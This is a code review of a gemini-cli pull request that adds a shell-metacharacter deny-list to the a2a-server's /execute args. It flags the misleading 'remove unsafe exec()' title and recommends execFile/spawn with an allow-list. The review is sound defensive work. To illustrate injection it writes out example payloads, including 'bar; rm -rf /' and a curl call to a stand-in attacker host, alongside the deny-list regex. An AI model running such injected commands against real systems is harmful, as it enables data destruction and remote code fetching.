# google-gemini/gemini-cli #26169 — fix: remove unsafe exec() in app.ts

- **PR:** https://github.com/google-gemini/gemini-cli/pull/26169
- **Head SHA:** `ead351c8c58434ce49db6e206e6832063b6225c1`
- **Size:** +12 / −0 (one validation block in `packages/a2a-server/src/http/app.ts`)

## Summary
PR title says "remove unsafe exec()" but the actual diff doesn't remove `exec()` — it adds a deny-list-style argv-validation block before whatever `commandToExecute` does with `args`. New block at `packages/a2a-server/src/http/app.ts:144-154` rejects any `args` element that is non-string OR contains any character from `[;&|\`$<>()\n\r\\]`, returning HTTP 400 `"Invalid characters in \"args\"."`. The intent is to prevent shell-metacharacter injection in callers that do interpolate `args` into a shell. **As-shaped, this is partial defense — see risks.**

## Specific observations

1. **The validation block at `packages/a2a-server/src/http/app.ts:144-154`:**
   ```ts
   if (args) {
     const shellMetacharPattern = /[;&|`$<>()\n\r\\]/;
     for (const arg of args as unknown[]) {
       if (typeof arg !== 'string' || shellMetacharPattern.test(arg)) {
         return res
           .status(400)
           .json({ error: 'Invalid characters in "args".' });
       }
     }
   }
   ```
   Runs after the existing `args field must be an array` check at `:138-141`. Order is right (array check first, content check second).

2. **Deny-list character set is `[;&|`$<>()\n\r\\]`** — covers the obvious shell-metacharacters (command separators `;&`, pipe `|`, backtick command substitution, `$()` substitution, redirection `<>`, parens for subshells, newlines, backslash). **Conspicuous omissions:**
   - **Whitespace** (`\t`, regular space) — not blocked. Most argv-injection attacks need whitespace to introduce a new argument; if the consumer is `child_process.execSync(cmd + ' ' + args.join(' '))`, then `args = ["foo", "bar; rm -rf /"]` is blocked (`;` rejected), but `args = ["foo bar --extra-flag"]` slips through and *creates* a new argv element on whitespace split. If the consumer uses `child_process.spawn(cmd, args, {shell: false})`, this is fine. The deny-list is sound only under the second invocation model — worth verifying `commandRegistry.get(command).execute()` actually uses `spawn` with `shell: false`.
   - **Single/double quotes (`'"`):** not blocked. If a downstream interpolates `args` into a shell string and the consumer doesn't use `spawn(..., {shell: false})`, an attacker could inject `args = ["x' && curl evil.example/x #"]` and the deny-list misses it (`'`, `&`, `&`, `#` — only the `&` is in the pattern, but only if it's outside a quote-broken-out context). The deny-list is a partial defense.
   - **Tilde `~`, glob chars `*?[]`, brace `{}`:** not blocked. If the consumer expands these, an attacker can read arbitrary files via glob expansion.

3. **`return res.status(400).json({ error: '...' })` returns immediately on the first bad arg** — does not loop through to flag all violations. Correct API behavior (early return), but the error message doesn't say *which* arg or *which* character — the caller has to bisect. Worth `error: \`Invalid characters in "args[\${i}]".\`` so debugging is easier.

4. **PR title vs diff mismatch:** "remove unsafe `exec()`" implies replacing `exec()` with `execFile()` / `spawn(..., {shell: false})`. The diff does neither. If the underlying handler still uses `exec()`, the deny-list is the only line of defense and any character not in the list is exploitable. **The actual fix should be at the call site** — replace `exec(cmd + ' ' + args.join(' '))` with `execFile(cmd, args)` so argv goes via the OS argv interface, not via shell parsing. Then this deny-list becomes belt-and-suspenders rather than the only belt.

5. **Cast `args as unknown[]`** at `:146` — type-system signal that the upstream type isn't strict enough to guarantee array-of-strings. The `typeof arg !== 'string'` check inside the loop catches the gap, but the upstream type should ideally be `string[]` so this defensive coercion is less necessary.

## Risks

- **The PR title is wrong / misleading** — `exec()` is not removed. If a reviewer trusts the title and merges without checking the actual handler, the unsafe call site stays and only some metacharacters are deny-listed.
- **Whitespace allowed in args** — fine if consumer uses `spawn(cmd, args, {shell: false})`, fatal if consumer concatenates into a shell string. Without grep-confirming the consumer, the deny-list could be an exploitable false sense of security.
- **Quotes and globs not blocked** — same conditional risk as whitespace. Allow-list (e.g. `^[A-Za-z0-9_.\-/=]+$`) would be safer than deny-list for command argv.
- **Error message doesn't aid debugging** — legitimate users who hit the deny-list (e.g. passing a path with `(` in it) get a generic "Invalid characters" with no hint about which arg or which character.
- **The deny-list won't catch encoded payloads** if the consumer URL-decodes / base64-decodes `args` before invoking. This PR only validates the wire-format string.

## Suggestions

- **(Recommended — blocker-level)** Change PR title and description to accurately describe the change: "fix: deny-list shell metacharacters in /execute args." If the goal is to remove `exec()`, do that in this PR — replace the call site with `execFile()` or `spawn(..., {shell: false})`. The deny-list alone is incomplete defense.
- **(Recommended)** Convert deny-list to allow-list: `if (!/^[A-Za-z0-9_.\-/=:@]*$/.test(arg))`. The allow-list is fail-safe under "consumer changed how it interprets args" — the deny-list is fail-open under that case.
- **(Recommended)** Include the offending index and character in the error: `\`Invalid characters in "args[\${i}]". Disallowed character: '\${badChar}'.\``
- **(Recommended)** Add a test for each rejected character (newline, backtick, dollar, semicolon, ampersand, pipe, redirection, subshell paren, backslash) plus a test for the non-string-element case. Without tests, the regex can silently regress.
- **(Recommended)** `rg -n "exec\\s*\\(" packages/a2a-server` to confirm whether `exec()` is actually called downstream. If yes, fix the call site too — the deny-list is the wrong layer for this defense.

## Verdict: `request-changes`

Title-vs-diff mismatch is the real blocker — "remove unsafe exec()" should remove the unsafe call, not just deny-list a subset of its trigger characters. Plus the deny-list itself is incomplete (whitespace, quotes, globs unblocked) and untested. The right shape is **(a)** replace `exec()` with `execFile()` / `spawn(..., {shell: false})` at the call site, **(b)** keep an allow-list-style argv validator as belt-and-suspenders, **(c)** add per-character tests, **(d)** improve the error message to name the offending arg index and character.

## What I learned

When the PR title says "remove unsafe X" and the diff does not remove X, the diff is the wrong fix shape. Validation and elimination are different operations: validation says "block these inputs," elimination says "use a safer API so input shape no longer matters." For argv-style payloads to a shell, elimination (`spawn(cmd, args, {shell: false})`) is always the right primary defense — validation is the secondary defense for the case where elimination isn't possible. This PR did the secondary defense without the primary, which is a partial fix dressed up as a complete one.
